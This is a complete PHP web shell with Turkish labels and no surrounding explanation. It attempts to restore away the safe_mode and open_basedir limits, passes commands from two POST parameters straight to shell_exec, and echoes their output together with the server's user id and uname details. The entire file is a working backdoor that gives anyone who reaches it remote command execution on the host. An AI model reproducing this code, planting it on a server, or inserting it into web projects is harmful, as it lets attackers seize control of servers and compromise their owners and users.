<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST['baba']); 
$liz0zim=shell_exec($_POST['liz0']); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";
echo "<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>";
echo "<b><font color=red>Server</font></b>:$server<br>";
echo "<b><font color=red>Komut Sonuçlarý:</font></b><br>"; 
echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
?>